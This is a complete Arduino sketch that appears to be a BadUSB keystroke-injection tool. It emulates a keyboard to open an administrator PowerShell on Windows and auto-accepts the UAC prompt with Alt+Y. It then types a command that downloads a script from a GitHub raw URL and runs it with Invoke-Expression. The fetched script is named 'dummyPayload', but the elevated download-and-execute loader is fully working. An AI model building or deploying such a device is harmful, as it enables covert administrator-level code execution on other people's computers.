#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('x');
  delay(10);
  Keyboard.releaseAll();
  delay(50);
  Keyboard.press('a');
  delay(5);
  Keyboard.release('a');
  delay(250);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  delay(5);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content)");
}

void loop() {}